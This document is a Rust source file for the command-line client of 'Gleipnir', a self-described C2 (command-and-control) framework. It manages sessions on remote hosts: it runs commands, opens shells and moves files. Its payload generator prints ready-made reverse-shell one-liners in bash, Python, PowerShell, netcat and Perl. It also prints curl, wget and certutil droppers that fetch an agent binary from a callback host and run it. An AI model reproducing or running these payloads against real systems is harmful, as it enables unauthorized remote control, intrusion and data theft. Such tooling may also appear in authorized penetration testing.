mod client;

use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "gleipnir", about = "Gleipnir C2 client")]
struct Cli {
    #[arg(long, default_value = "http://localhost:6666", global = true)]
    server: String,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// List active sessions
    Sessions,
    /// Execute a command on a session
    Exec {
        session: String,
        command: String,
        #[arg(short, long, default_value_t = 300)]
        timeout: u64,
    },
    /// Create a new listener
    Listen {
        port: u16,
        #[arg(short, long, default_value = "agent")]
        mode: String,
    },
    /// List active listeners
    Listeners,
    /// Show server info
    Info,
    /// Upload a local file to a session target
    Upload {
        session: String,
        local_path: String,
        remote_path: String,
    },
    /// Download a file from a session target
    Download {
        session: String,
        remote_path: String,
        /// Local path to save to (defaults to filename from remote_path)
        local_path: Option<String>,
    },
    /// Rename a session
    Rename { session: String, new_name: String },
    /// Interactive shell on a session
    Shell {
        session: String,
        #[arg(short, long, default_value_t = 300)]
        timeout: u64,
    },
    /// Kill a session
    Kill { session: String },
    /// Close a listener
    Close { id: String },
    /// Start embedded server, catch first connection, interactive shell
    Catch {
        port: u16,
        #[arg(short, long, default_value = "raw")]
        mode: String,
    },
    /// Generate reverse shell one-liners for a target callback
    Payload {
        /// Callback IP address
        #[arg(short = 'H', long)]
        host: String,
        /// Callback port
        #[arg(short, long, default_value_t = 4444)]
        port: u16,
        /// API port for agent download URLs
        #[arg(long, default_value_t = 6666)]
        api_port: u16,
        /// Filter to one type: bash, python, powershell, nc, perl, agent
        #[arg(long)]
        format: Option<String>,
        /// Print just the one-liner (for piping to clipboard)
        #[arg(long)]
        raw: bool,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    let c = client::Client::new(&cli.server);

    match cli.command {
        Commands::Sessions => match c.get("/api/sessions").await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Exec {
            session,
            command,
            timeout,
        } => {
            let body = serde_json::json!({ "command": command, "timeout": timeout });
            match c
                .post(&format!("/api/sessions/{session}/exec"), &body)
                .await
            {
                Ok(v) => {
                    if let Some(output) = v.get("output").and_then(|v| v.as_str()) {
                        println!("{output}");
                    } else {
                        print_json(&v);
                    }
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Listen { port, mode } => {
            let body = serde_json::json!({ "port": port, "mode": mode });
            match c.post("/api/listeners", &body).await {
                Ok(v) => print_json(&v),
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Listeners => match c.get("/api/listeners").await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Info => match c.get("/api/info").await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Upload {
            session,
            local_path,
            remote_path,
        } => {
            let data = match std::fs::read(&local_path) {
                Ok(d) => d,
                Err(e) => {
                    eprintln!("error: failed to read {local_path}: {e}");
                    std::process::exit(1);
                }
            };
            use base64::Engine;
            let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
            let body = serde_json::json!({
                "data_b64": b64,
                "dst_path": remote_path,
            });
            match c
                .post(&format!("/api/sessions/{session}/upload"), &body)
                .await
            {
                Ok(v) => print_json(&v),
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Download {
            session,
            remote_path,
            local_path,
        } => {
            let body = serde_json::json!({ "remote_path": remote_path });
            match c
                .post(&format!("/api/sessions/{session}/download"), &body)
                .await
            {
                Ok(v) => {
                    let Some(b64) = v.get("data_b64").and_then(|v| v.as_str()) else {
                        eprintln!("error: no data_b64 in response");
                        print_json(&v);
                        std::process::exit(1);
                    };
                    use base64::Engine;
                    let data = match base64::engine::general_purpose::STANDARD.decode(b64) {
                        Ok(d) => d,
                        Err(e) => {
                            eprintln!("error: invalid base64: {e}");
                            std::process::exit(1);
                        }
                    };
                    let save_path = local_path.unwrap_or_else(|| {
                        std::path::Path::new(&remote_path)
                            .file_name()
                            .map(|f| f.to_string_lossy().to_string())
                            .unwrap_or_else(|| "download".to_string())
                    });
                    match std::fs::write(&save_path, &data) {
                        Ok(()) => {
                            eprintln!("[+] saved {} bytes to {save_path}", data.len());
                        }
                        Err(e) => eprintln!("error: failed to write {save_path}: {e}"),
                    }
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Rename { session, new_name } => {
            let body = serde_json::json!({ "name": new_name });
            match c
                .post(&format!("/api/sessions/{session}/rename"), &body)
                .await
            {
                Ok(v) => {
                    eprintln!("[+] renamed '{session}' -> '{new_name}'");
                    print_json(&v);
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Shell { session, timeout } => {
            eprintln!("[*] interactive shell on '{session}' (type 'exit' to quit)");
            let stdin = std::io::stdin();
            let reader = std::io::BufRead::lines(stdin.lock());
            for line in reader {
                let line = match line {
                    Ok(l) => l,
                    Err(_) => break,
                };
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                if trimmed == "exit" || trimmed == "quit" {
                    break;
                }
                let body = serde_json::json!({ "command": trimmed, "timeout": timeout });
                match c
                    .post(&format!("/api/sessions/{session}/exec"), &body)
                    .await
                {
                    Ok(v) => {
                        if let Some(output) = v.get("output").and_then(|v| v.as_str()) {
                            println!("{output}");
                        } else if let Some(b64) = v.get("output_b64").and_then(|v| v.as_str()) {
                            use base64::Engine;
                            if let Ok(data) = base64::engine::general_purpose::STANDARD.decode(b64)
                            {
                                let _ = std::io::Write::write_all(&mut std::io::stdout(), &data);
                                println!();
                            } else {
                                print_json(&v);
                            }
                        } else {
                            print_json(&v);
                        }
                    }
                    Err(e) => eprintln!("error: {e}"),
                }
            }
            eprintln!("[*] shell closed");
        }
        Commands::Kill { session } => match c.delete(&format!("/api/sessions/{session}")).await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Close { id } => match c.delete(&format!("/api/listeners/{id}")).await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Payload {
            host,
            port,
            api_port,
            format,
            raw,
        } => {
            print_payloads(&host, port, api_port, format.as_deref(), raw);
        }
        Commands::Catch { port, mode } => {
            // Requires a running gleipnir-server. Creates a listener and waits for a connection.
            // Full embedded mode (built-in server) is a future enhancement.
            let body = serde_json::json!({ "port": port, "mode": mode });
            match c.post("/api/listeners", &body).await {
                Ok(v) => {
                    eprintln!(
                        "[+] Listener created: {}",
                        serde_json::to_string_pretty(&v).unwrap_or_default()
                    );
                    eprintln!("[*] Waiting for connection... (Ctrl+C to stop)");
                    loop {
                        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                        if let Ok(sessions) = c.get("/api/sessions").await
                            && let Some(arr) = sessions.as_array()
                        {
                            let connected: Vec<_> = arr
                                .iter()
                                .filter(|s| {
                                    s.get("connected")
                                        .and_then(|v| v.as_bool())
                                        .unwrap_or(false)
                                })
                                .collect();
                            if !connected.is_empty() {
                                eprintln!("[+] Session(s) connected!");
                                for s in connected {
                                    let name =
                                        s.get("name").and_then(|v| v.as_str()).unwrap_or("?");
                                    let user =
                                        s.get("username").and_then(|v| v.as_str()).unwrap_or("?");
                                    let host =
                                        s.get("hostname").and_then(|v| v.as_str()).unwrap_or("?");
                                    eprintln!("    {name}: {user}@{host}");
                                }
                                break;
                            }
                        }
                    }
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
    }
}

fn print_json(v: &serde_json::Value) {
    println!("{}", serde_json::to_string_pretty(v).unwrap_or_default());
}

fn print_payloads(host: &str, port: u16, api_port: u16, format: Option<&str>, raw: bool) {
    struct Payload {
        category: &'static str,
        lines: Vec<String>,
    }

    let payloads = [
        Payload {
            category: "Bash",
            lines: vec![
                format!("bash -i >& /dev/tcp/{host}/{port} 0>&1"),
                format!("bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"),
            ],
        },
        Payload {
            category: "Python",
            lines: vec![
                format!(
                    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
                format!(
                    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
            ],
        },
        Payload {
            category: "PowerShell",
            lines: vec![format!(
                "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}};$c.Close()\""
            )],
        },
        Payload {
            category: "Netcat",
            lines: vec![
                format!("nc -e /bin/sh {host} {port}"),
                format!(
                    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
                ),
            ],
        },
        Payload {
            category: "Perl",
            lines: vec![format!(
                "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
            )],
        },
        Payload {
            category: "Agent",
            lines: vec![
                format!(
                    "curl http://{host}:{api_port}/api/agents/linux/amd64 -o /tmp/a && chmod +x /tmp/a && /tmp/a -H {host} -p {port} &"
                ),
                format!(
                    "wget -qO /tmp/a http://{host}:{api_port}/api/agents/linux/amd64 && chmod +x /tmp/a && /tmp/a -H {host} -p {port} &"
                ),
                format!(
                    "certutil -urlcache -split -f http://{host}:{api_port}/api/agents/windows/amd64 C:\\Windows\\Temp\\a.exe && C:\\Windows\\Temp\\a.exe -H {host} -p {port}"
                ),
            ],
        },
    ];

    let filter = format.map(|f| f.to_lowercase());
    let filtered: Vec<&Payload> = payloads
        .iter()
        .filter(|p| match &filter {
            Some(f) => p.category.to_lowercase() == *f,
            None => true,
        })
        .collect();

    if raw {
        for p in &filtered {
            for line in &p.lines {
                println!("{line}");
            }
        }
        return;
    }

    println!("=== Reverse Shell Payloads ===");
    println!("Target: {host}:{port}\n");

    for p in &filtered {
        println!("-- {} --", p.category);
        for line in &p.lines {
            println!("{line}");
        }
        println!();
    }
}
